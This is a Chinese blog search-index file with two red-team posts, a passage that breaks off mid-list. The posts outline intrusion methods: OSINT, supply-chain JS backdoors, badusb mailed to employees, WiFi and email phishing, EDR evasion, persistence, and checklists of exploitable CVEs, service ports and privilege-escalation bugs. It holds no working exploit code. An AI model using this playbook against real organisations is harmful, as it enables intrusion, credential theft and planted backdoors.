<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>红队姿势</title>
      <link href="/2020/073061047.html"/>
      <url>/2020/073061047.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>红队的特点是什么?</strong><br>区别于传统的渗透测试,更偏向于实战,面对的场景也更加复杂,技术繁多,以目的为导向,需要有能够解决突发问题的能力.<br><strong>红队的核心是什么?</strong><br>发散思维,让各种技术有应用场景,需要有更多的攻击面,掌握特殊技巧.<br><strong>红队之路是什么?</strong><br>在实践中不断地”填坑”,不断实战,完善战术和武器的过程.<br><strong>大型网络渗透的思路有哪些?</strong><br>参考来自红队的一些Tricks(小灰师傅的另外一个议题),ppt自行谷歌查找.</p><ul><li>撕开口子(ssrf-&gt;内网渗透)</li><li>判断出目标位置和目标环境</li><li>通过osint,获得关键信息,攻击脆弱系统,进入内网.</li><li>寻找”软柿子”,从邮箱突破 -&gt;获得VPN账号密码-&gt;内网渗透-&gt;…..</li><li>边界渗透<ul><li>组织业务架构分析(天眼查,主站业务方向,业务合作单位,海外业务)</li><li>判断目标网络架构(ssrf,内网ip泄露,citrix,exchange,域认证,云盘,文库,git)</li><li>关键业务分析(员工通讯录,密码字典制作,各种oa(泛微,通达,致远,金蝶),mail,vpn,通讯工具,sso)</li></ul></li><li>外网攻击入口选择<ul><li>关注度低和防护薄弱的系统(边远地区,无MFA机制的系统,使用高危漏洞进行批量)</li></ul></li><li>供应链打击</li><li>办公系统,集权系统</li><li>有敏感信息泄露的系统</li><li>业务线较长的系统(公司的网络结构分布在各个地市,进行迂回攻击)</li><li>常见的信息收集<ul><li>pdns</li><li>子域名网段</li><li>github检索</li><li>爬兄弟域名</li><li>app请求</li><li>js信息收集</li><li>微信公众号</li><li>favicon.ico</li><li>ssl cert</li></ul></li><li>横|纵向移动<ul><li>先潜伏,别急于扫描,会触发edr</li><li>潜伏策略(dns,icmp,tcp,http,测试机,备份机,老资产,运维终端pc,办公区,业务大,复杂的系统)</li><li>内网知识储备(很多人问我内网渗透怎么学好点,我的建议都是去copy dm写的那本书的目录,自己网上查查资料,东西不多,需要实践,不实践你永远不会踩坑,也不会进步)</li><li>域渗透基础知识(自行谷歌学习)</li><li>内网信息收集(自行谷歌学习)</li><li>防御对抗<ul><li>hw遇到的防护手段 (封ip,waf,白名单机制,各种安全设备(nids,hids,edr,soc,蜜罐),溯源反制)</li><li>对策(代理池,cms识别,waf测试与绕过,加载自己的dll,逆向agent,patch掉防火墙等设备,流量加密,虚拟机,心跳包回连,回连cdn,回连端口转发)</li></ul></li></ul></li></ul><h2 id="Content"><a href="#Content" class="headerlink" title="Content"></a>Content</h2><ul><li>“水坑攻击”在红队场景的运用</li><li>对抗技术在红队行动中的实践</li><li>主被动方式结合-实现挖坑反击</li><li>RedTeamer的未来</li></ul><h2 id="“水坑攻击”在红队场景的运用"><a href="#“水坑攻击”在红队场景的运用" class="headerlink" title="“水坑攻击”在红队场景的运用"></a>“水坑攻击”在红队场景的运用</h2><p>github蜜罐,你遇到过吗?<br>以及内网的一些常见服务蜜罐.将redis部署在真实环境里,但是redis服务的流量走的是蜜罐系统,导致被防守方逮到.</p><h3 id="使用OSINT进行情报搜集"><a href="#使用OSINT进行情报搜集" class="headerlink" title="使用OSINT进行情报搜集"></a>使用OSINT进行情报搜集</h3><ul><li>搜索引擎(fofa,shodan,Google,Zoomeye,bing)</li><li>百度文库,CSDN</li><li>天眼查相关资产</li><li>riskiq.com开源情报</li><li>子域名,爬虫链接,github</li><li>内部情报(加QQ群,钉钉群,微信群)</li></ul><p>收集到架构,资产,邮箱,敏感资料,专利,账号密码等等</p><p>通过收集的账号密码登录邮箱系统,coremail rce-&gt;导出邮件内容-&gt;被系统制裁╮(╯_╰)╭</p><h3 id="tricks"><a href="#tricks" class="headerlink" title="tricks"></a>tricks</h3><p>github在设置邮箱的时候可以获得github账户名,脚本批量测试<br>看图说话</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDEvMTMvMTU3ODkwMzU4ODcxMzEuanBn?x-oss-process=image/format,png" alt="-w760"></p><p>jsonp劫持可以获取目标的互联网信息,qq邮箱,163邮箱等.</p><h3 id="供应链攻击-留后门"><a href="#供应链攻击-留后门" class="headerlink" title="供应链攻击,留后门"></a>供应链攻击,留后门</h3><p>获取到开发人员权限后,可以选择往源码里插入一段js,等源码部署以后,可以结合xss平台进行权限维持(键盘记录,内网渗透等等)<br>xss平台beef其实很香的,模块很多.<br>js后门的好处:</p><ul><li>获得代码部署地址</li><li>键盘记录</li><li>通过ajax动态获得页面内容</li><li>通过访问ip分析人员区域</li><li>随时更改js内容,做进一步利用,ie浏览器和flash攻击</li></ul><h3 id="近源攻击"><a href="#近源攻击" class="headerlink" title="近源攻击"></a>近源攻击</h3><p>(<a href="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDEvMTMvMTU3ODkwNDc3MDY5NzMuanBn?x-oss-process=image/format,png" target="_blank" rel="noopener">https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDEvMTMvMTU3ODkwNDc3MDY5NzMuanBn?x-oss-process=image/format,png</a>)</p><h4 id="U盘攻击"><a href="#U盘攻击" class="headerlink" title="U盘攻击"></a>U盘攻击</h4><p>直接往人家银行门口扔U盘?你咋知道被谁捡去了,赔钱的买卖.<br>通过信息收集,和其他的方法找到工作人员地址,比如订单信息泄露,寄一个badusb到他家,往U盘里送上最真挚的祝福,加一个小贺卡,让他快点打开看看U盘里面你对他到底进行了啥祝福.<br>￣ω￣=</p><p>badusb的一些tricks:</p><ul><li>使用unicode反转字符攻击,诱导点击</li><li>可执行文件的后缀-dll,hta,bat,sct,vbs,ps1</li><li>office漏洞利用和宏攻击</li><li>特殊文件后缀名,exe,pif,com,cmd,scr</li><li>双击反弹shell文件和脚本,chm,ink,iqy,jsjse,cpl,wsh,wsf</li></ul><p>注册表<code>HKEY/LOCALMACHINE/SOFTWARE/Classes</code>中可以找到能执行命令的后缀,</p><h4 id="WIFI钓鱼"><a href="#WIFI钓鱼" class="headerlink" title="WIFI钓鱼"></a>WIFI钓鱼</h4><p>近源攻击中最为常见的就是路由器,有0day的话可以进行链路劫持,进行行为审计,<br>看一下无声的这个武器.</p><p>(<a href="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDEvMTMvMTU3ODkwNDk4OTcwODAuanBn?x-oss-process=image/format,png" target="_blank" rel="noopener">https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDEvMTMvMTU3ODkwNDk4OTcwODAuanBn?x-oss-process=image/format,png</a>)</p><p><strong>-w1136</strong></p><p>可见武器化的好处</p><p>一次攻击链:</p><ul><li>webrtc获取内网地址</li><li>对可以发起http请求导致rce的路由器发起探测</li><li>获得权限后,通过流量采集获取某些网站接口的凭据,强制加好友</li><li>聊天触发某插件热更新,劫持替换,运行导致手机rce</li></ul><p><strong>WIFI登录页面钓鱼</strong></p><ul><li>在内网的话,可以获取员工的工号和密码,ACl配置不当的情况下可以扫描内网资源(DNS重定向)</li><li>抓hash</li><li>dns可控的情况下,结合WPAD进行中继攻击</li></ul><h2 id="对抗技术在红队行动中的实践"><a href="#对抗技术在红队行动中的实践" class="headerlink" title="对抗技术在红队行动中的实践"></a>对抗技术在红队行动中的实践</h2><h3 id="ip封禁"><a href="#ip封禁" class="headerlink" title="ip封禁"></a>ip封禁</h3><p><a href="https://github.com/RhinSecurityLabs/IPRotate_Burp_Extension" target="_blank" rel="noopener">https://github.com/RhinSecurityLabs/IPRotate_Burp_Extension</a></p><p>通过aws的服务进行ip替换</p><p>或者使用pymultitor</p><h3 id="DMZ出网的权限维持"><a href="#DMZ出网的权限维持" class="headerlink" title="DMZ出网的权限维持"></a>DMZ出网的权限维持</h3><p>常规是使用DNS,HTTP协议</p><p>换个思路,直接把邮件服务器当做C2,传递信息回来,相关代码自己github查找</p><h3 id="EDR多维度对抗"><a href="#EDR多维度对抗" class="headerlink" title="EDR多维度对抗"></a>EDR多维度对抗</h3><ul><li>实时监控是否有特定的进程执行,参数和进程的调用关系树</li><li>内存分析</li><li>异常检测</li><li>流量监测</li></ul><p>Bypass(后面几种是我的想法):</p><ul><li>参数污染</li><li>shellcode分离加载</li><li>行为免杀</li><li>反沙箱(判断当前环境是否是沙箱,内存,磁盘空间,等等,参考veil模块)</li><li>无文件技术(用forfiles免杀)</li><li>流量免杀</li><li>shellcode加密</li><li>blockdll</li><li>白加黑利用</li></ul><h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><h4 id="单机权限维持-这个我最近在写总结-尽快赶出来"><a href="#单机权限维持-这个我最近在写总结-尽快赶出来" class="headerlink" title="单机权限维持(这个我最近在写总结,尽快赶出来)"></a>单机权限维持(这个我最近在写总结,尽快赶出来)</h4><ul><li>服务类:bitadmin,计划任务,sqlserver job</li><li>logon Scripts修改注册表</li><li>dll劫持</li><li>白加黑利用</li><li>服务类路径,通过powerup寻找加以利用</li></ul><h4 id="域权限维持"><a href="#域权限维持" class="headerlink" title="域权限维持"></a>域权限维持</h4><p>看图,做一个补充</p><p>(<a href="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDEvMTMvMTU3ODkwNjI0NDE0MjkuanBn?x-oss-process=image/format,png" target="_blank" rel="noopener">https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDEvMTMvMTU3ODkwNjI0NDE0MjkuanBn?x-oss-process=image/format,png</a>)</p><h3 id="主被动方式实现挖坑反击"><a href="#主被动方式实现挖坑反击" class="headerlink" title="主被动方式实现挖坑反击"></a>主被动方式实现挖坑反击</h3><h4 id="内网横向移动技术到底是研究什么"><a href="#内网横向移动技术到底是研究什么" class="headerlink" title="内网横向移动技术到底是研究什么?"></a>内网横向移动技术到底是研究什么?</h4><ul><li>内网拓扑环境,知道有哪些机器,我现在在哪个位置,下一步我要去哪?</li><li>获得当前账户,具有什么权限,受什么规则影响,可以进行什么操作,可以用什么手段横向?</li><li>怎么获得更多的用户名和密码以及权限</li><li>怎么拿到域内指定的机器(日志,邮件,收集的信息,ldap查询)</li></ul><h4 id="护网横向移动优先攻击策略"><a href="#护网横向移动优先攻击策略" class="headerlink" title="护网横向移动优先攻击策略"></a>护网横向移动优先攻击策略</h4><p>目标内网往往非常大,快读定位和找到关键节点是攻击的关键,选择的主要原则为:</p><ul><li>快速掌握目标网络架构和网络设备及集权系统,(堡垒机,运维管理机,性能监控系统,集中管控系统,域控等)</li><li>查找配置文件,系统日志,管理文件,建设方案,wiki,文档云,托管代码等,获取敏感信息,为纵向移动打下基础.</li></ul><h4 id="网络环境中的信息收集"><a href="#网络环境中的信息收集" class="headerlink" title="网络环境中的信息收集"></a>网络环境中的信息收集</h4><ul><li>dns信息</li><li>快速定位域控(方法很多,不多说)</li><li>route信息</li><li>net view \dc</li><li>域信息(dc,group,user,密码策略,委派关系,票据,域信任关系)</li><li>445端口获取banner判断是否在域内</li><li>ldap query</li><li>spn扫描</li><li>域认证服务机器日志</li></ul><h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><ul><li>使用ping -a反向解析IP</li><li>先通过ldap查询获得域内计算机名称,再通过dns查询获得ip</li><li>dnscnd的使用</li></ul><h3 id="单主机-系统程序-安装软件"><a href="#单主机-系统程序-安装软件" class="headerlink" title="单主机,系统程序,安装软件"></a>单主机,系统程序,安装软件</h3><ul><li>系统日志(追踪来源,堡垒机,管理人员电脑)</li><li>最近使用的程序</li><li>安装应用</li><li>浏览器历史记录,浏览器密码,代理配置</li><li>系统密码,hash,mscache,rdp连接记录,rdp凭据,vpn,xshell,Navicat,winscp</li><li>内存中kerberos票据</li><li>其他用户token</li><li>session信息</li><li>redthief被动获取密码</li></ul><h3 id="精准定位"><a href="#精准定位" class="headerlink" title="精准定位"></a>精准定位</h3><ul><li>域控日志</li><li>系统记录日志</li><li>查询用户userWorkstation字段</li><li>使用组策略给用户绑定登录脚本</li><li>Email</li></ul>]]></content>
      
      
      <categories>
          
          <category> 红队 </category>
          
          <category> 内网 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>内网入口</title>
      <link href="/2020/073026401.html"/>
      <url>/2020/073026401.html</url>
      
        <content type="html"><![CDATA[<h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><pre><code>以下仅针对日常 &quot;红队&quot; 场景, 进行了一次相对全面完整的实战攻击利用技术提炼汇总针对不同的渗透阶段,所可能会用到的一些技术都做了详尽梳理说明 (后面可能还会整理出对应的完整工具链,虽然那不是最主要的)由于红队不同于一般的渗透测试, 强调更多的是如何搞进去拿到相应机器权限 或者 实现某特定目的而不局限于你一定要在什么时间, 用什么技术 或者 必须通过什么途径去搞,相比传统渗透测试,红队则更趋于真实的入侵活动这种场景其实对防御者的 实战对抗经验 和 技术深度 都是比较大的挑战所以,以下的所有技术点也几乎都是完全站在这种场景和角度下来考量梳理的需要特别说明的是, 所有攻击手法在现实中都绝不是完全孤立使用的, 往往很多手法都是相互灵活组合起来进行循环利用由于绝大部分内容都是基于本人平时学习实战积累的一些经验,加之每个人的实际渗透思路都不同所以肯定会有遗漏的地方,也欢迎弟兄们一起来积极指正补充完善个人觉得,最好的防御永远不是怎么去防某个工具,是个明白人都知道,因为工具这些东西本身就是死的稍微改下,定制下, 现有的规则可能马上就防不住了,且一直会处于疲于应付的被动防御状态尤其是针对红队这种特殊场景的,你的实际对手很可能都是有一定技术实力的人所以针对每种核心的攻击技术技术展开做深入分析, 直接从源头上进行防御才是最靠谱的虽然说短期这种成本代价相对较高, 但长期来看, 是一劳永逸的, 沉淀下来的这些东西最终也会慢慢形成自己产品的核心竞争力和特色说白点,这种对抗,本质上拼的还是双方的技术实力,不仅要能在不知觉的情况下搞进去,而且要能无限制加大对方后期的溯源成本另外,作为一名合格的攻防人员,工具的熟练掌握仅仅只是极小的一部分,对各种利用原理的深度理解和二次定制能力才是你的核心</code></pre><h3 id="日常流程简要说明"><a href="#日常流程简要说明" class="headerlink" title="日常流程简要说明"></a>日常流程简要说明</h3><pre><code>入口权限 =&gt; 内网搜集/探测 =&gt; 免杀提权[非必须] =&gt; 抓取登录凭证 =&gt; 跨平台横向 =&gt; 入口维持 =&gt; 数据回传 =&gt; 定期权限维护</code></pre><h3 id="0x01-入口权限获取-前期侦察，搜集阶段本身就不存在太多可防御的点，非防御重心"><a href="#0x01-入口权限获取-前期侦察，搜集阶段本身就不存在太多可防御的点，非防御重心" class="headerlink" title="0x01 入口权限获取 [ 前期侦察，搜集阶段本身就不存在太多可防御的点，非防御重心 ]"></a>0x01 入口权限获取 [ 前期侦察，搜集阶段本身就不存在太多可防御的点，非防御重心 ]</h3><pre><code>绕CDN找出目标所有真实ip段找目标的各种Web管理后台登录口批量抓取目标所有真实C段 Web banner批量对目标所有真实C段 进行基础服务端口扫描探测识别尝试目标DNS是否允许区域传送,如果不允许则继续尝试子域爆破批量抓取目标所有子域 Web banner批量对目标所有子域集中进行基础服务端口探测识别批量识别目标 所有存活Web站点的Web程序指纹 及其详细版本从 Git 中查找目标泄露的各类 敏感文件 及 账号密码,偶尔甚至还能碰到目标不小心泄露的各种云的 &quot;AccessKey&quot;从网盘 / 百度文库 中查找目标泄露的各类 敏感文件 及 账号密码从各第三方历史漏洞库中查找目标曾经泄露的 各种敏感账号密码 [ 国内目标很好使 ]目标Svn里泄露的各类 敏感文件网站目录扫描 [ 查找目标网站泄露的各类敏感文件, 网站备份文件, 敏感配置文件, 源码 , 别人的webshell, 等等等...]目标站点自身在前端代码中泄露的各种敏感信息fofa / shodan / bing / google  hacking 深度利用搜集目标 学生学号 / 员工工号 / 目标邮箱 [ 并顺手到各个社工库中去批量查询这些邮箱曾经是否泄露过密码 ]目标自己对外提供的各种 技术文档 / wiki 里泄露的各种账号密码及其它敏感信息目标微信小程序分析目标app Web请求借助js探针搜集目标内网信息想办法混入目标的各种 内部QQ群 / 微信群分析目标直接供应商 [尤其是技术外包]根据前面已搜集到的各类信息制作有针对性的弱口令字典目标所用 Waf 种类识别 与 绕过BypassWAF 文件上传 / 读取 / 下载   BypassWAF Sql注入   BypassWAF RCE   BypassWAF 各类Java Web中间件已知Nday漏洞利用   BypassWAF Webshell 免杀其它更多 , 待补充修正...</code></pre><h3 id="0x02-入口权限获取-外部防御重心-“重中之重”"><a href="#0x02-入口权限获取-外部防御重心-“重中之重”" class="headerlink" title="0x02 入口权限获取 [ 外部防御重心 ( “重中之重” ) ]"></a>0x02 入口权限获取 [ 外部防御重心 ( “重中之重” ) ]</h3><pre><code>此阶段,主要是针对各主流 &quot;中间件 + 开源程序 + Web服务组件&quot; 自身的各种已知Nday漏洞利用如下已按 &quot;实际攻击利用的难易程度&quot; 及 &quot;获取到的shell权限高低&quot; 为标准进行了详细排序,由于完全以实战利用为导向故,仅仅只挑选了一些相对会经常遇到的,且实战中确实能有效协助快速getshell 的 &quot;中间件&quot; , &quot;开源程序&quot; 及 &quot;web组件&quot;</code></pre><h4 id="针对各类Java中间件的各种已知Nday漏洞利用"><a href="#针对各类Java中间件的各种已知Nday漏洞利用" class="headerlink" title="针对各类Java中间件的各种已知Nday漏洞利用"></a>针对各类Java中间件的各种已知Nday漏洞利用</h4><pre><code>不同于其它脚本类web程序,Java的运行权限通常都比较高,甚至大部分都是直接用root/administrator/system权限在跑所以拿到的shell权限一般也非常高,通常都直接是服务器权限尤其是在各种红队场景中,入侵者一般也都会首选这些点,并以此为突破口来获取一个稳定的跳板机入口权限关于到底哪些行业特别爱用哪些中间件,这些也应该都是有事先分析梳理汇总好的</code></pre><ul><li><p>Struts2</p><pre><code>Struts2-005Struts2-008Struts2-009Struts2-013Struts2-016(实际上,很多都老系统都漏补了这个洞,成功率较高)Struts2-019Struts2-020Struts2-devmodeStruts2-032Struts2-033Struts2-037Struts2-045Struts2-046Struts2-048Struts2-052Struts2-053Struts2-057</code></pre></li><li><p>weblogic</p><pre><code>CVE-2019-2725CVE-2019-2729CVE-2018-3191CVE-2018-2628CVE-2018-2893CVE-2018-2894CVE-2017-3506CVE-2017-10271CVE-2017-3248CVE-2016-0638CVE-2016-3510CVE-2015-4852CVE-2014-4210</code></pre></li></ul><p>SSRF<br>控制台弱口令,部署webshell</p><pre><code>+ Jboss</code></pre><p>CVE-2015-7501<br>CVE-2017-7504<br>CVE-2017-12149</p><p>未授权访问,部署webshell<br>控制台弱口令,部署webshell</p><pre><code>+ wildfly [ jboss 7.x 改名为 wildfly ]</code></pre><p>控制台弱口令,部署webshell</p><pre><code>+ Tomcat</code></pre><p>CVE-2016-8735<br>CVE-2017-12615 [ readonly 实际设为 true的情况较少,稍鸡肋 ]<br>CVE-2020-1938 [ AJP协议漏洞, 直接把8009端口暴露在外网的不太多,稍鸡肋 ]</p><p>控制台弱口令,部署webshelll [ 注: 7.x版本后,默认加了防爆机制 ]</p><pre><code>+ Jekins</code></pre><p>CVE-2018-1999002 [任意文件读取]</p><p>未授权访问,任意命令执行<br>控制台弱口令,任意命令执行</p><pre><code>+ ElasticSearch</code></pre><p>CVE-2014-3120 [专门针对老版本(无沙盒)RCE]<br>CVE-2015-1427 [Groovy RCE]<br>CVE-2015-3337 [任意文件读取]</p><p>未授权访问,敏感信息泄露</p><pre><code>+ RabbitMQ</code></pre><p>弱口令</p><pre><code>+ Glassfish</code></pre><p>任意文件读取 [ 低版本 ]<br>控制台弱口令,部署webshell</p><pre><code>+ IBM Websphere</code></pre><p>Java 反序列化<br>控制台弱口令,部署webshell</p><pre><code>+ Axis2</code></pre><p>任意文件读取<br>目录遍历</p><pre><code>+ Apache ActiveMQ</code></pre><p>未授权访问,5.12 之前的版本 fileserver存在 PUT任意写<br>CVE-2015-5254</p><pre><code>+ Apache Solr</code></pre><p>CVE-2017-12629<br>CVE-2019-0193 [ Apache Solr 5.x - 8.2.0 ]</p><pre><code>+ Apache Zookeeper</code></pre><p>未授权访问,敏感信息泄露</p><pre><code>+ Apache Shiro反序列化+ fastjson &lt;= 1.2.47 反序列化利用####  针对各类Windows php集成环境  [ 由于此类环境拿到的Webshell权限相对较高,所以,通常也是红队人员的首选突破口 ]</code></pre><p>AppServ<br>Xampp<br>宝塔<br>PhpStudy<br>……</p><pre><code>#### 针对各类开源程序的 已知Nday漏洞利用</code></pre><p>Dedecms     后台弱口令,系列已知nday漏洞利用<br>thinkphp 5.x     后台弱口令,系列已知nday漏洞利用<br>phpcms         后台弱口令,系列已知nday漏洞利用<br>ecshop         后台弱口令,系列已知nday漏洞利用<br>Metinfo     后台弱口令,系列已知nday漏洞利用<br>discuz         后台弱口令,系列已知nday漏洞利用<br>帝国cms     后台弱口令,系列已知nday漏洞利用<br>phpmyadmin     数据库弱口令,系列已知nday漏洞利用<br>wordpress     后台弱口令,系列已知nday漏洞利用<br>joomla         后台弱口令,系列已知nday漏洞利用<br>drupal         CVE-2018-7600 ,后台弱口令,系列已知nday漏洞利用<br>……</p><pre><code>#### 针对其它各类Web组件的 已知Nday漏洞利用+ IIS 6.0 RCE</code></pre><p>短文件漏洞<br>PUT 任意写<br>Webdav RCE CVE-2017-7269</p><pre><code>+ 禅道项目管理系统</code></pre><p>SQL注入<br>文件读取<br>远程执行</p><pre><code>+ 通达OA</code></pre><p>SQL注入<br>任意上传</p><pre><code>+ Exchange</code></pre><p>利用接口进行邮箱用户名枚举<br>针对各个接口的弱口令爆破<br>CVE-2020-0688 [ 利用前提是需要先得有任意一个邮箱用户权限 ]<br>….</p><pre><code>+ Zimbra [ XXE + SSRF =&gt; RCE ]</code></pre><p>CVE-2013-7091<br>CVE-2016-9924<br>CVE-2019-9670</p><pre><code>+ Citrix</code></pre><p>CVE-2019-19781</p><pre><code>+ Jumpserver</code></pre><p>身份验证绕过</p><pre><code>+ Zabbix</code></pre><p>CVE-2017-2824<br>SQL注入 [ 2.0 老版本 ]<br>控制台弱口令,敏感机器信息泄露</p><pre><code>+ Cacti</code></pre><p>低版本 SQL注入<br>控制台弱口令</p><pre><code>+ Nagios</code></pre><p>CVE-2016-9565<br>控制台弱口令</p><pre><code>+ Webmin RCE</code></pre><p>CVE-2019-15107 </p><pre><code>+ PHPMailer</code></pre><p>CVE-2016-10033</p><pre><code>+ 泛微OA远程代码执行+ 金蝶OA SQL注入+ Coremail 敏感文件泄露+ UEditor 任意文件上传+ OpenSSL心脏滴血抓明文账号密码  [ Heartbleed ]+ 破壳漏洞 [ Shellshock ] #### 各种能快速getshell的常规基础Web漏洞利用 [ 注: 有些漏洞在不审代码的情况下其实是很难有效盲测到的 ]</code></pre><p>后台弱口令<br>SSRF<br>sql注入<br>越权<br>命令 / 代码执行 / 反序列化<br>任意文件上传 / 下载 / 读取<br>包含<br>XSS（实际上,XSS只有在针对某些特定邮箱,手里有浏览器0day时价值才会比较大,红队场景下其实并不是非常致命)<br>业务逻辑漏洞</p><pre><code>#### 针对各类边界网络设备的各种利用,主要是Web管理控制台登录弱口令 及 各类已知nday攻击利用+ Pulse Secure VPN</code></pre><p>CVE-2019-11510 [ 任意文件读取 ]</p><pre><code>+ Fortinet VPN</code></pre><p>CVE-2018-13379 [ 文件读取 ]</p><pre><code>+ Sangfor Vpn RCE### 0x03 入口权限获取 [ 专门针对各类基础服务端口的各种getshell利用，防御重点 ( &quot;重中之重&quot; ) ]</code></pre><p>此处仅仅只挑选了一些实战中真正能协助快速getshell的服务,其它的一些相对边缘性的服务均未提及<br>同样,已按 “实际攻击利用的难易程度” 及 “获取到的shell权限高低” 为标准进行了详细排序<br>如下,就每个端口的具体攻击利用方式,进行了简要说明</p><pre><code>* Top Port List</code></pre><p>Mssql       [ 默认工作在tcp 1433端口, 弱口令, 敏感账号密码泄露, 提权, 远程执行, 后门植入 ]<br>SMB       [ 默认工作在tcp 445端口, 弱口令, 远程执行, 后门植入 ]<br>WMI       [ 默认工作在tcp 135端口, 弱口令, 远程执行, 后门植入 ]<br>WinRM      [ 默认工作在tcp 5985端口, 此项主要针对某些高版本Windows, 弱口令, 远程执行, 后门植入 ]<br>RDP       [ 默认工作在tcp 3389端口, 弱口令, 远程执行, 别人留的shift类后门 ]<br>SSH       [ 默认工作在tcp 22端口, 弱口令, 远程执行, 后门植入 ]<br>ORACLE    [ 默认工作在tcp 1521端口, 弱口令, 敏感账号密码泄露, 提权, 远程执行, 后门植入 ]<br>Mysql     [ 默认工作在tcp 3306端口, 弱口令, 敏感账号密码泄露, 提权(只适用于部分老系统) ]<br>REDIS      [ 默认工作在tcp 6379端口, 弱口令, 未授权访问, 写文件(webshell,启动项,计划任务), 提权 ]<br>POSTGRESQL[ 默认工作在tcp 5432端口, 弱口令, 敏感信息泄露 ]<br>LDAP      [ 默认工作在tcp 389端口, 未授权访问, 弱口令, 敏感账号密码泄露 ]<br>SMTP      [ 默认工作在tcp 25端口, 服务错误配置导致的用户名枚举漏洞, 弱口令, 敏感信息泄露 ]<br>POP3      [ 默认工作在tcp 110端口, 弱口令, 敏感信息泄露 ]<br>IMAP      [ 默认工作在tcp 143端口, 弱口令, 敏感信息泄露 ]<br>Exchange  [ 默认工作在tcp 443端口, 接口弱口令爆破 eg: Owa,ews,oab,AutoDiscover… pth脱邮件, 敏感信息泄露 … ]<br>VNC       [ 默认工作在tcp 5900端口, 弱口令 ]<br>FTP       [ 默认工作在tcp 21端口, 弱口令, 匿名访问/可写, 敏感信息泄露 ]<br>Rsync     [ 默认工作在tcp 873端口, 未授权, 弱口令, 敏感信息泄露 ]<br>Mongodb   [ 默认工作在tcp 27017端口, 未授权, 弱口令 ]<br>TELNET    [ 默认工作在tcp 23端口, 弱口令, 后门植入 ]<br>SVN       [ 默认工作在tcp 3690端口, 弱口令, 敏感信息泄露 ]<br>JAVA RMI  [ 默认工作在tcp 1099端口, 可能存在反序列化利用 ]<br>CouchDB   [ 默认工作在tcp 5984端口, 未授权访问 ]</p><pre><code>### 0x04 入口权限获取#### 传统钓鱼攻击利用，实际护网场景中用的非常频繁，细节非常多，此处不一一列举，防御重点* 发信前期准备</code></pre><p>枚举有效的目标邮箱用户名列表<br>批量探测目标邮箱弱口令<br>伪造发信人 [ 发信邮服搭建 ]<br>钓鱼信 [ 针对不同行业一般也都会事先准备好各种各样的针对性的发信话术模板,以此来提到实际发信成功率 ]<br>……</p><pre><code>* 典型投递方式 </code></pre><p>第一种,直接给目标发送各种常规木马信 </p><p>传统宏利用<br>捆绑<br>exe[zip,7z]<br>lnk<br>chm<br>自解压<br>木马链接<br>OLE<br>CVE-2017-11882 [ 利用漏洞触发 ]<br>…</p><pre><code></code></pre><p>第二种,给目标发送各种钓鱼链接,比如, 利用各种目标登录口的钓鱼页面来窃取各种内网账号密码 </p><p>Vpn<br>Mail<br>OA<br>Net ntlm hash [ 远程模板注入,pdf…钓hash,国内ISP过滤SMB流量不适用 ]<br>……</p><pre><code>### 0x05 主机安全 [ 提权利用，防御重点 ]</code></pre><p>以下只单独挑了一些在 通用性, 稳定性, 易用性, 实际成功率 都相对较好的洞 和 方式 其它的一些”边缘性”的利用都暂未提及</p><pre><code>* Windows 系统漏洞 本地提权 [ 成功的前提是,保证事先已做好各种针对性免杀 ]</code></pre><p>BypassUAC [ win7 / 8  / 8.1 / 10 ]<br>MS14-058[KB3000061]                    [重点]<br>MS14-068[KB3011780]                    [重点]<br>ms15-051[KB3045171]                    [重点]<br>MS15-077[KB3077657]                    [重点]<br>MS16-032[KB3124280]                    [重点]<br>ms16-075                        [重点]<br>MS16-135[KB3199135]                    [重点]<br>MS17-010[KB4013389]                    [重点]<br>cve-2019-0708                        [重点]<br>CVE-2019-0803                        [重点]<br>CVE-2019-1322 &amp; CVE-2019-1405                [重点]<br>cve-2019-12750 [ 赛门铁克(用的较多)本地提权 ]        [重点]        </p><pre><code>* linux 内核漏洞 本地提权 [ linux-exploit-suggester ]</code></pre><p>CVE-2016-5195                        [重点]<br>CVE-2017-16995<br>CVE-2019-13272</p><pre><code>* 利用各类第三方服务 / 软件工具提权</code></pre><p>Mssql                             [重点]<br>Oracle                                 [重点]<br>Mysql<br>各类第三方软件dll劫持                     [重点]<br>suid权限<br>计划任务<br>各种错误服务配置利用</p><pre><code>### 0x06 内网安全 [ 敏感信息搜集，防御重点，可在此项严格限制各种系统内置命令执行 ]* 搜集当前已控&quot;跳板机&quot;的各类敏感信息</code></pre><p>注: 如下某些操作肯定是需要事先自己想办法先拿到管理权限后才能正常进行的,此处不再赘述</p><p>查看当前shell权限 及 详细系统内核版本<br>获取当前系统的 详细ip配置,包括 所在域, ip, 掩码, 网关, 主备 dns ip<br>获取当前系统最近的用户登录记录<br>获取当前用户的所有命令历史记录 [ 主要针对linux,里面可能包含的有各类敏感账号密码,ip,敏感服务配置… ]<br>获取本机所有 服务/进程 [包括各个进程的详细权限,也包括目标系统中的可疑恶意进程(有可能是同行的马)]/端口/网络连接信息<br>获取本机所用杀软 / 监控种类 [ 后续好针对性的做免杀 